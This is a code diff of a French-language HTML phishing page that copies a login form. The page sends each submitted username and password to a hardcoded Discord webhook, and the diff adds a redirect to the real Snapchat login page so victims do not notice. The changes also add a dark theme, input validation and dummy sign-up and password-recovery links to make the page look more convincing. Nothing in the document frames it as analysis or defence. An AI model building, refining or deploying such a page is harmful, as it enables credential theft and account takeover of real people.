@@ -8,24 +8,32 @@
     body {
       margin: 0; padding: 0;
       font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f0f0f0; /* fond gris clair */
+      background-color: #000000; /* fond noir */
+      color: #ffffff; /* texte blanc par défaut */
       display: flex; justify-content: center; align-items: center;
       height: 100vh;
     }
     .login-box {
       width: 100%; max-width: 400px;
       padding: 40px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
       border-radius: 10px;
       text-align: center;
-      background-color: #ffffff; /* blanc pour la boîte */
+      background-color: #1a1a1a; /* boîte sombre */
+      color: #ffffff; /* texte blanc */
     }
     input[type="text"], input[type="password"] {
       width: 100%; padding: 12px;
       margin: 10px 0;
-      border: 1px solid #ccc;
+      border: 1px solid #444;
       border-radius: 8px;
       font-size: 16px;
+      background-color: #333;
+      color: #fff;
+    }
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: #bbb;
     }
     button {
       background-color: #fffc00;
@@ -39,6 +47,33 @@
     button:hover {
       background-color: #e6e600;
     }
+    #errorMessage {
+      color: #ff4d4d; /* rouge vif */
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .links-container {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    .link-button {
+      background: transparent;
+      border: none;
+      color: #66aaff;
+      font-weight: bold;
+      cursor: pointer;
+      user-select: none;
+      padding: 0;
+      font-family: inherit;
+      font-size: inherit;
+      text-decoration: underline;
+    }
+    #forgotPassword {
+      color: #66aaff;
+    }
   </style>
 </head>
 <body>
@@ -48,20 +83,39 @@
       <input type="text" id="username" placeholder="Nom d'utilisateur ou e-mail" required />
       <input type="password" id="password" placeholder="Mot de passe" required />
       <button type="submit">Connexion</button>
+      <div class="links-container">
+        <button type="button" class="link-button" id="signupLink">S'inscrire</button>
+        <button type="button" class="link-button" id="forgotPassword">Mot de passe oublié</button>
+      </div>
     </form>
+    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1382387384997515294/yI75S1jd9z_vRaMRNBYR8Kk_i8rNs8_cMeeNtMRoU7IZgWtI-R6Cch95PsOPsG51K8s2";
+    const redirectURL = "https://accounts.snapchat.com/accounts/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%253A%252F%252Fwww.snapchat.com%252Fweb%252Ff3411d81-73e7-59d1-a928-9af58b989e8a";
 
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const errorMessage = document.getElementById('errorMessage');
+
+      if (
+        username.length < 3 ||
+        password.length < 3 ||
+        username.includes(" ") ||
+        password.includes(" ")
+      ) {
+        errorMessage.style.display = 'block';
+        return;
+      } else {
+        errorMessage.style.display = 'none';
+      }
 
       const message = {
-        content: `**Nouveau login reçu:**\nNom d'utilisateur: \`${username}\`\nMot de passe: \`${password}\``
+        content: `**Nouveau login reçu:**\nNom d'utilisateur: ${username}\nMot de passe: ${password}`
       };
 
       fetch(webhookURL, {
@@ -73,6 +127,7 @@
         if (response.ok) {
           alert("Données envoyées avec succès !");
           document.getElementById('loginForm').reset();
+          window.location.href = redirectURL;
         } else {
           alert("Erreur lors de l'envoi des données.");
         }
@@ -81,6 +136,16 @@
         alert("Erreur réseau ou CORS.");
         console.error(error);
       });
+    });
+
+    document.getElementById('signupLink').addEventListener('click', () => {
+      alert("Redirection vers la page d'inscription...");
+      // Exemple : window.location.href = "inscription.html";
+    });
+
+    document.getElementById('forgotPassword').addEventListener('click', () => {
+      alert("Redirection vers la récupération de mot de passe...");
+      // Exemple : window.location.href = "recuperation.html";
     });
   </script>
 </body>
